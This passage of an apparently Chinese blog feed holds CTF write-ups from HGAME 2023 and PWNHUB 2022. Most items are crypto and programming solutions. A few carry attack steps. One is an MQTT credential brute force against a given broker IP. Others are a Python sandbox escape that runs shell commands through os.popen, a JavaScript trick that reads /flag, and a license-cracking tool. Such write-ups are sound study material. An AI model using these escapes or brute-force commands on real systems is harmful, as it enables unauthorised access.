class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># Metamask私钥</span></span><br><span class="line">private_key = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># abi在Remix上编译.sol源码后获取</span></span><br><span class="line">abi = json.loads(<span class="string">&#x27;[&#123;&quot;inputs&quot;: [&#123;&quot;internalType&quot;: &quot;string&quot;,&quot;name&quot;: &quot;_greeting&quot;,&quot;type&quot;: &quot;string&quot;&#125;],&quot;stateMutability&quot;: &quot;nonpayable&quot;,&quot;type&quot;: &quot;constructor&quot;&#125;,&#123;&quot;inputs&quot;: [],&quot;name&quot;: &quot;greet&quot;,&quot;outputs&quot;: [&#123;&quot;internalType&quot;: &quot;string&quot;,&quot;name&quot;: &quot;&quot;,&quot;type&quot;: &quot;string&quot;&#125;],&quot;stateMutability&quot;: &quot;view&quot;,&quot;type&quot;: &quot;function&quot;&#125;,&#123;&quot;inputs&quot;: [],&quot;name&quot;: &quot;isSolved&quot;,&quot;outputs&quot;: [&#123;&quot;internalType&quot;: &quot;bool&quot;,&quot;name&quot;: &quot;&quot;,&quot;type&quot;: &quot;bool&quot;&#125;],&quot;stateMutability&quot;: &quot;view&quot;,&quot;type&quot;: &quot;function&quot;&#125;,&#123;&quot;inputs&quot;: [&#123;&quot;internalType&quot;: &quot;string&quot;,&quot;name&quot;: &quot;_greeting&quot;,&quot;type&quot;: &quot;string&quot;&#125;],&quot;name&quot;: &quot;setGreeting&quot;,&quot;outputs&quot;: [],&quot;stateMutability&quot;: &quot;nonpayable&quot;,&quot;type&quot;: &quot;function&quot;&#125;]&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取合约</span></span><br><span class="line">contract = w3.eth.contract(address=contractAddress, abi=abi)</span><br><span class="line">nonce = w3.eth.getTransactionCount(Web3.toChecksumAddress(myAccount))</span><br><span class="line"><span class="comment"># 合约交易定义，调用函数setGreeting</span></span><br><span class="line"><span class="comment"># 事先保证myAccount有足够ether支付gas*gasPrice+value，从水龙头获取ether</span></span><br><span class="line">tx = contract.functions.setGreeting(<span class="string">&#x27;HelloHGAME!&#x27;</span>).buildTransaction(&#123;</span><br><span class="line">    <span class="string">&#x27;from&#x27;</span>: Web3.toChecksumAddress(myAccount),</span><br><span class="line">    <span class="string">&#x27;gasPrice&#x27;</span>: w3.eth.gasPrice,</span><br><span class="line">    <span class="string">&#x27;nonce&#x27;</span>: nonce,</span><br><span class="line">    <span class="string">&#x27;value&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">    &#125;)</span><br><span class="line">gas = w3.eth.estimate_gas(tx)</span><br><span class="line">tx[<span class="string">&#x27;gas&#x27;</span>] = gas</span><br><span class="line"><span class="built_in">print</span>(tx)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 交易执行</span></span><br><span class="line">signed_txn = w3.eth.account.signTransaction(tx, private_key)</span><br><span class="line"><span class="built_in">print</span>(signed_txn.<span class="built_in">hash</span>)</span><br><span class="line"><span class="built_in">print</span>(signed_txn.rawTransaction)</span><br><span class="line"></span><br><span class="line">tmp =  w3.eth.sendRawTransaction(signed_txn.rawTransaction.<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure><p>最后nc连接，选4获取flag。</p><p>​    </p><h2 id="Iot"><a href="#Iot" class="headerlink" title="Iot"></a>Iot</h2><h3 id="Help-marvin"><a href="#Help-marvin" class="headerlink" title="Help marvin"></a>Help marvin</h3><blockquote><p>兔兔发现售票的marvin只会吐出三个白头 决定去修一修marvin(-30)</p><p>HINTS:</p><p>Hint: SPI</p></blockquote><p>给定的是sr文件，解压，根据文件内容搜索知为逻辑分析套件sigrok生成的文件。</p><p>使用PulseView工具打开sr文件，在D0/D1/D2有数据，参考 <a href="https://blog.csdn.net/qq_42880719/article/details/123763744">2022DASCTF X SU 三月春季挑战赛 What’s In The Bits</a> 以及后放的提示，知符合SPI协议特征。</p><p>选择SPI解码器，clock选D0，输入选D2，导出所有解码的01字符：</p><p><code>00110100001100111011000010110110101100101011110110011010001011111001101010111010000110100011011100110011101100101010111110101001101110000001100010111110</code></p><p>去掉头位0，8位一组可还原字符串 <code>hgame&#123;4_5t4nge_Sp1&gt;</code>，修正最后一位补足一位1，得 <code>hgame&#123;4_5t4nge_Sp1&#125;</code>。</p><p>​    </p><h3 id="Help-the-uncle-who-can’t-jump-twice"><a href="#Help-the-uncle-who-can’t-jump-twice" class="headerlink" title="Help the uncle who can’t jump twice"></a>Help the uncle who can’t jump twice</h3><blockquote><p>兔兔在车站门口看到一张塑料凳子,上边坐着一个自称V的男人.他希望你能帮他登上他的大号 Vergil 去那边的公告栏上康康Nero手上的YAMATO怎么样了</p><p>broker:117.50.177.240:1883</p><p>HINTS:</p><p>Hint: mqtt</p></blockquote><p>根据broker地址知使用的MQTT协议，参考 <a href="https://zhuanlan.zhihu.com/p/581871896">物联网安全实战从零开始-MQTT协议分析</a> 安装mqtt-pwn。</p><p>使用命令爆破 Vergil 的密码，指定给定的密码本：</p><p><code>bruteforce --host 117.50.177.240 --port 1883 -u Vergil -pf password.txt</code></p><p>得到结果：</p><p><code>[+] Found valid credentials: Vergil:power</code></p><p>下载broker连接工具MQTT.fx，使用账密 <code>Vergil/power</code> 登录broker，在订阅处输入主题 <code>Nero/YAMATO</code>，收到包含flag的信息：<code>hgame&#123;mqtt_1s_p0w3r&#125;</code>。</p><p>​    </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;HGAME 2023 将于 1 月 5 日 20:00 正式开始，祝大家玩得开心 :-)&lt;br&gt;线上赛平台：&lt;a href=&quot;https://hgame.vidar.club/&quot;&gt;https://hgame.vidar.club&lt;/a&gt;&lt;br&gt;请尽</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2023赛" scheme="https://lazzzaro.github.io/tags/2023%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>PWNHUB2022冬季赛</title>
    <link href="https://lazzzaro.github.io/2022/12/18/match-PWNHUB2022%E5%86%AC%E5%AD%A3%E8%B5%9B/"/>
    <id>https://lazzzaro.github.io/2022/12/18/match-PWNHUB2022%E5%86%AC%E5%AD%A3%E8%B5%9B/</id>
    <published>2022-12-18T15:20:03.000Z</published>
    <updated>2022-12-20T10:40:05.641Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>✌️竞赛时间：12月17日 10:00—12月18日 22:00<br>✌️得分规则：比赛采用动态分数制度 ，每道题目的分值将根据解出队伍的数量进行动态记分。<br>✌️题目类型：Web、Pwn、Reverse、Misc、Crypto等</p><p><strong>Rank: 9</strong></p><hr><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="坐井观天"><a href="#坐井观天" class="headerlink" title="坐井观天"></a>坐井观天</h3><p>python逃逸，利用 <code>eval(input())</code> 绕过关键字黑名单：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).popen(<span class="string">&quot;env&quot;</span>).read()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="证书里也有秘密"><a href="#证书里也有秘密" class="headerlink" title="证书里也有秘密"></a>证书里也有秘密</h3><p>xray证书信息解析，参考Github项目 <a href="https://github.com/net5/xray-crack">xray-crack</a>，将 <code>main.go</code> 编译：</p><p><code>go build -o goxray main.go</code></p><p>再运行：</p><p><code>./goxray -p xray-license.lic</code></p><p>即可得到证书内容数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">version ok: 2</span><br><span class="line">license parsed: &#123;bc5d237dc9b7470e94b61687c19e62fc 3270cdada4eb4a809d25ff4820d5a1f7 王德发 COMMUNITY-ADVANCED 1320981071 1645539742&#125;</span><br><span class="line">crypto/rsa: verification error</span><br></pre></td></tr></table></figure><p>故flag为user_id：<code>flag&#123;3270cdada4eb4a809d25ff4820d5a1f7&#125;</code>。</p><p>​    </p><h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="大杂烩"><a href="#大杂烩" class="headerlink" title="大杂烩"></a>大杂烩</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">padding = <span class="keyword">lambda</span> num, bit_len: (num &lt;&lt; (<span class="number">512</span> - bit_len)) + getrandbits(<span class="number">512</span> - bit_len)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;**************************************&#x27;</span></span><br><span class="line">m1, m2 = bytes_to_long(flag[:<span class="number">19</span>]), bytes_to_long(flag[<span class="number">19</span>:])</span><br><span class="line">p = next_prime(padding(m1, m1.bit_length()))</span><br><span class="line">q = next_prime(padding(m2, m2.bit_length()))</span><br><span class="line">n = p * q</span><br><span class="line">e = getPrime(<span class="number">128</span>)</span><br><span class="line">d = inverse(e, (p - <span class="number">1</span>) * (q-<span class="number">1</span>))</span><br><span class="line">a, b = e &amp; <span class="number">0x3ffffffffff</span>, e &gt;&gt; <span class="number">42</span></span><br><span class="line">N = getPrime(<span class="number">128</span>)</span><br><span class="line">E = EllipticCurve(Zmod(N), [a, b])</span><br><span class="line">NN = getPrime(<span class="number">1024</span>)</span><br><span class="line">S = inverse(getPrime(<span class="number">128</span>), NN) * inverse(getPrime(<span class="number">128</span>), NN)</span><br><span class="line">d1 = d &gt;&gt; <span class="number">512</span></span><br><span class="line">d2 = d &amp; (<span class="number">1</span> &lt;&lt; <span class="number">512</span>) - <span class="number">1</span></span><br><span class="line">enc1 = S * d1 % NN</span><br><span class="line">enc2 = S * d2 % NN</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n =&#x27;</span>, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;a =&#x27;</span>, a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;N =&#x27;</span>, N)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;POINT =&#x27;</span>, E.lift_x(<span class="number">996</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;enc1 =&#x27;</span>, enc1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;enc2 =&#x27;</span>, enc2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;NN =&#x27;</span>, NN)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># n = 117749279680045360245987277946945707343578937283621512842997606104123872211782263906911929773756533011817679794905642225389185861207256322349591633257348367854563703050789889773031032949742664695416275919382068347995088593380486820784360816053546651916291080971628354468517506190756456913824397593128781030749</span></span><br><span class="line"><span class="comment"># a = 1755716071599</span></span><br><span class="line"><span class="comment"># N = 236038564943567983056828121309828109017</span></span><br><span class="line"><span class="comment"># POINT = (996 : 151729833458737979764886336489671975339 : 1)</span></span><br><span class="line"><span class="comment"># enc1 = 98662590652068949920571979585725979127266112216583776160769090971169664292493813021843624362593669574513220457664819153878956311077379392531742253343961645534972639309537402874636739745717765969720117162780620981639015788423324884640935466801234207019510919768602974162878323777374364290185048275714332671356</span></span><br><span class="line"><span class="comment"># enc2 = 58738699705013897273174837829098879580829898980458718341881900446701910685043213698485036350888862454440118347362218485065377354137391792039111639199258042591959084091242821874819864955504791788260187064338245516327147327866373690756260239728218244294166383516151782123688633986853602732137707507845681977204</span></span><br><span class="line"><span class="comment"># NN = 149794788177729409820185150543033616327574456754306207341321223589733698623477041345453230785413920341465642754285280273761269552897080096162195035057667200692677841848045965505750839903359478511509753781737513122660495056746669041957643882516287304836822410136985711091802722010788615177574143908444311475347</span></span><br></pre></td></tr></table></figure></blockquote><p>$a,b$ 分别为 $e$ 的低42位和高(128-42)位，有 $e=2^{42}b+a$。</p><p>$a$ 已知，根据点 $P=(P_x,P_y)$ 及椭圆曲线 $E$ 方程 $y^2 \equiv x^3+ax+b \pmod N$，代入求解 $b$。</p><p>同理，$d=2^{512}d_1+d_2$，因 $c_1 = Sd_1 \bmod N’,c_2 = Sd_2 \bmod N’$，分别使用类似Wiener Attack的格子求解 $d_1,d_2$。</p><p>最后已知 $e,d,n$，分解 $n$ 得 $p,q$，flag两部分分别在 $p,q$ 中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">divide_pq</span>(<span class="params">e, d, n</span>):</span><br><span class="line">    k = e*d - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        g = random.randint(<span class="number">2</span>, n-<span class="number">1</span>)</span><br><span class="line">        t = k</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">if</span> t % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            t //= <span class="number">2</span></span><br><span class="line">            x = <span class="built_in">pow</span>(g, t, n)</span><br><span class="line">            <span class="keyword">if</span> x &gt; <span class="number">1</span> <span class="keyword">and</span> gmpy2.gcd(x-<span class="number">1</span>, n) &gt; <span class="number">1</span>:</span><br><span class="line">                p = gmpy2.gcd(x-<span class="number">1</span>, n)</span><br><span class="line">                <span class="keyword">return</span> (p, n//p)</span><br><span class="line"></span><br><span class="line">n = <span class="number">117749279680045360245987277946945707343578937283621512842997606104123872211782263906911929773756533011817679794905642225389185861207256322349591633257348367854563703050789889773031032949742664695416275919382068347995088593380486820784360816053546651916291080971628354468517506190756456913824397593128781030749</span></span><br><span class="line">a = <span class="number">1755716071599</span></span><br><span class="line">N = <span class="number">236038564943567983056828121309828109017</span></span><br><span class="line">Px, Py = (<span class="number">996</span>, <span class="number">151729833458737979764886336489671975339</span>)</span><br><span class="line">enc1 = <span class="number">98662590652068949920571979585725979127266112216583776160769090971169664292493813021843624362593669574513220457664819153878956311077379392531742253343961645534972639309537402874636739745717765969720117162780620981639015788423324884640935466801234207019510919768602974162878323777374364290185048275714332671356</span></span><br><span class="line">enc2 = <span class="number">58738699705013897273174837829098879580829898980458718341881900446701910685043213698485036350888862454440118347362218485065377354137391792039111639199258042591959084091242821874819864955504791788260187064338245516327147327866373690756260239728218244294166383516151782123688633986853602732137707507845681977204</span></span><br><span class="line">NN = <span class="number">149794788177729409820185150543033616327574456754306207341321223589733698623477041345453230785413920341465642754285280273761269552897080096162195035057667200692677841848045965505750839903359478511509753781737513122660495056746669041957643882516287304836822410136985711091802722010788615177574143908444311475347</span></span><br><span class="line"></span><br><span class="line">F = Zmod(N)</span><br><span class="line">b = <span class="built_in">int</span>(F(Py^<span class="number">2</span> - (Px^<span class="number">3</span> + a*Px)))</span><br><span class="line">e = <span class="number">2</span>^<span class="number">42</span> * b + a</span><br><span class="line"></span><br><span class="line">L1 = Matrix(ZZ, [[enc1, <span class="number">2</span>^<span class="number">256</span>],[NN, <span class="number">0</span>]])</span><br><span class="line">d1 = -L1.LLL()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">L2 = Matrix(ZZ, [[enc2, <span class="number">2</span>^<span class="number">256</span>],[NN, <span class="number">0</span>]])</span><br><span class="line">d2 = -L2.LLL()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">d = <span class="number">2</span>^<span class="number">512</span> * d1 + d2</span><br><span class="line"></span><br><span class="line">p, q = divide_pq(e, d, n)</span><br><span class="line">flag1 = <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(p&gt;&gt;(<span class="number">512</span>-<span class="number">19</span>*<span class="number">8</span>+<span class="number">2</span>))[<span class="number">2</span>:])</span><br><span class="line">flag2 = <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(q&gt;&gt;(<span class="number">512</span>-<span class="number">19</span>*<span class="number">8</span>+<span class="number">1</span>))[<span class="number">2</span>:])</span><br><span class="line"><span class="built_in">print</span>(flag1)</span><br><span class="line"><span class="built_in">print</span>(flag2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;4cb201080d8b240774&#125;&#x27;</span></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;e89f47939d1243&#x27;</span></span><br></pre></td></tr></table></figure><p>flag：<code>flag&#123;e89f47939d12434cb201080d8b240774&#125;</code>。</p><p>​    </p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="justJS"><a href="#justJS" class="headerlink" title="justJS"></a>justJS</h3><p>js命令执行即可：</p><p><code>eval(read(&quot;/flag&quot;))</code></p><p>在 <code>eval()</code> 的报错文字中得到flag：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">undefined:1: SyntanError: Unexpected token &#x27;&#123;&#x27;</span><br><span class="line">flag&#123;5cff08f23eb37451bd84effb99275794&#125;</span><br><span class="line">    ^</span><br><span class="line">SyntanError: Unexpected token &#x27;&#123;&#x27;</span><br><span class="line">    at input.js:1:6</span><br></pre></td></tr></table></figure><p>​    </p><h2 id="ppc"><a href="#ppc" class="headerlink" title="ppc"></a>ppc</h2><h3 id="Tcp-Show"><a href="#Tcp-Show" class="headerlink" title="Tcp Show"></a>Tcp Show</h3><blockquote><p><strong>Description</strong></p><p>众所周知，Wireshark 带有一个 follow tcp stream 功能，可以展示 TCP 流量的来回通信。</p><p>为了给某产品增加显示 TCP 来回流量的功能，你准备读取流量文件来生成类似的展示效果。</p><p><strong>Input</strong></p><p>第一行输入一个数字 N，表示接下来有 N 行。</p><p>接下来 N 行，每一行都由两部分组成。首先是一个数字 D，数字 D 为 0 表示为客户端发给服务器的方向，数字 D 为 1 表示服务器发给客户端方向；然后第二部分是一个 base64 字符串，表示编码后的流量具体内容。</p><p><strong>Output</strong></p><p>对于每一行的流量包，生成类似 wireshark 的 hexdump 模式的流量展示。其中：</p><ol><li><p>每行开头都是 8 位 hex，表示当前这一行在该流量包的偏移。</p></li><li><p>两个空格之后，是该流量包的 hex dump 内容，每行 16 个 hex dump。</p></li><li><p>hex dump 之后，是该流量包内容的字符显示，对于可见字符(32 ~ 126)，显示字符本身，对于不可见字符，显示一个 . 号</p></li><li><p>对于无法凑齐 16 个 hex 的行，其不足的内容用空格代替。确保每一行的总长度是相等的。</p></li><li><p>根据下面的样例，仔细处理空格的数量。</p></li></ol></blockquote><p>按照输出要求格式化解析即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> ceil</span><br><span class="line"></span><br><span class="line">N = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">    k, b = <span class="built_in">input</span>().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    h = <span class="built_in">list</span>(b64decode(b.encode()))</span><br><span class="line">    <span class="keyword">if</span> k == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(ceil(<span class="built_in">len</span>(h)/<span class="number">16</span>)):</span><br><span class="line">            ind = <span class="built_in">hex</span>(i*<span class="number">16</span>)[<span class="number">2</span>:].rjust(<span class="number">8</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">            hh = h[<span class="number">16</span>*i:<span class="number">16</span>*(i+<span class="number">1</span>)]</span><br><span class="line">            hh1 = <span class="string">&#x27; &#x27;</span>.join([<span class="built_in">hex</span>(j)[<span class="number">2</span>:].rjust(<span class="number">2</span>,<span class="string">&#x27;0&#x27;</span>) <span class="keyword">for</span> j <span class="keyword">in</span> hh[:<span class="number">8</span>]] + [<span class="string">&#x27;  &#x27;</span>]*(<span class="number">8</span>-<span class="built_in">len</span>(hh[:<span class="number">8</span>])))</span><br><span class="line">            hh2 = <span class="string">&#x27; &#x27;</span>.join([<span class="built_in">hex</span>(j)[<span class="number">2</span>:].rjust(<span class="number">2</span>,<span class="string">&#x27;0&#x27;</span>) <span class="keyword">for</span> j <span class="keyword">in</span> hh[<span class="number">8</span>:]] + [<span class="string">&#x27;  &#x27;</span>]*(<span class="number">8</span>-<span class="built_in">len</span>(hh[<span class="number">8</span>:])))</span><br><span class="line">            ch1 = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(j) <span class="keyword">if</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>) <span class="keyword">else</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">for</span> j <span class="keyword">in</span> hh[:<span class="number">8</span>]]).ljust(<span class="number">8</span>,<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            ch2 = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(j) <span class="keyword">if</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>) <span class="keyword">else</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">for</span> j <span class="keyword">in</span> hh[<span class="number">8</span>:]]).ljust(<span class="number">8</span>,<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;ind&#125;</span>  <span class="subst">&#123;hh1&#125;</span>  <span class="subst">&#123;hh2&#125;</span>   <span class="subst">&#123;ch1&#125;</span> <span class="subst">&#123;ch2&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(ceil(<span class="built_in">len</span>(h)/<span class="number">16</span>)):</span><br><span class="line">            ind = <span class="built_in">hex</span>(i*<span class="number">16</span>)[<span class="number">2</span>:].rjust(<span class="number">8</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">            hh = h[<span class="number">16</span>*i:<span class="number">16</span>*(i+<span class="number">1</span>)]</span><br><span class="line">            hh1 = <span class="string">&#x27; &#x27;</span>.join([<span class="built_in">hex</span>(j)[<span class="number">2</span>:].rjust(<span class="number">2</span>,<span class="string">&#x27;0&#x27;</span>) <span class="keyword">for</span> j <span class="keyword">in</span> hh[:<span class="number">8</span>]] + [<span class="string">&#x27;  &#x27;</span>]*(<span class="number">8</span>-<span class="built_in">len</span>(hh[:<span class="number">8</span>])))</span><br><span class="line">            hh2 = <span class="string">&#x27; &#x27;</span>.join([<span class="built_in">hex</span>(j)[<span class="number">2</span>:].rjust(<span class="number">2</span>,<span class="string">&#x27;0&#x27;</span>) <span class="keyword">for</span> j <span class="keyword">in</span> hh[<span class="number">8</span>:]] + [<span class="string">&#x27;  &#x27;</span>]*(<span class="number">8</span>-<span class="built_in">len</span>(hh[<span class="number">8</span>:])))</span><br><span class="line">            ch1 = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(j) <span class="keyword">if</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>) <span class="keyword">else</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">for</span> j <span class="keyword">in</span> hh[:<span class="number">8</span>]]).ljust(<span class="number">8</span>,<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            ch2 = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(j) <span class="keyword">if</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>) <span class="keyword">else</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">for</span> j <span class="keyword">in</span> hh[<span class="number">8</span>:]]).ljust(<span class="number">8</span>,<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;        <span class="subst">&#123;ind&#125;</span>  <span class="subst">&#123;hh1&#125;</span>  <span class="subst">&#123;hh2&#125;</span>   <span class="subst">&#123;ch1&#125;</span> <span class="subst">&#123;ch2&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Fight-Clones"><a href="#Fight-Clones" class="headerlink" title="Fight Clones"></a>Fight Clones</h3><blockquote><p><strong>Description</strong></p><p>Neo 被 Smith 的分身们包围了！他需要击败他们！</p><p>每一个 Smith 都有自己的攻击值和生命值。在受到攻击之前，他们都可以持续攻击 Neo。</p><p>Neo 也有自己的攻击值和生命值，虽然比 Smith 高得多，但是 Neo 一次也只能攻击一个 Smith（是的他没有 AOE）。</p><p>Neo 需要找到一个最优的攻击策略，以保证自己生命值被减为零之前击倒所有 Smith。</p><p>Neo 的生命值是确定的，Oracle 之前告诉过他。但是他需要知道自己的攻击值是否能够确保打赢 Smith 们。</p><p>你能帮 Neo 计算出他所需要的最小攻击值么？</p><p><strong>Input</strong></p><p>第一行输入两个整数 $N H$ ($1 \le N \le 1000,1 \le H \le 1000000$)，表示总共有 $N$ 个 Smith，以及 Neo 的生命值为 $H$。</p><p>接下来 $N$ 行，表示 $N$ 个 Smith 的属性，每行格式为 $AH$，其中</p><p>- $A$ 为该 Smith 的攻击值 ($1 \le A \le 1000$)。</p><p>- $H$ 为该 Smith 的生命值 ($1 \le H \le 1000$)。</p><p><strong>Output</strong></p><p>输出一个整数，表示所需要的最小攻击值。如果无法保证击败 Smith 们则输出 <code>-1</code>。</p><p><strong>Hint</strong></p><p>Neo 和 Smith 们是 <code>实时战斗制</code>（非回合制），即 Neo 和 Smith 们可以<strong>同时</strong>攻击对方，只不过 Neo 一个时间只能打一个 Smith，</p><p>而 Smith 们可以群殴 Neo（不用考虑碰撞体积的问题）。</p><p>可以假定 Neo 和 Smith 们每单位时间只能<strong>击打对手一次</strong>。例如，某个 Smith 生命值为 20，而 Neo 攻击值为 15，那 Neo 也需要消耗</p><p>两个单位的时间来消灭该 Smith，同时意味着有 10 单位的攻击力被浪费掉了。</p><p>Smith 一旦受到 Neo 的攻击，就会停止击打 Neo。例如 Neo 和 Smith 某一个时刻同时攻击对方，Neo 则不会受到伤害。</p></blockquote><p>贪心算法+二分查找最小攻击值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 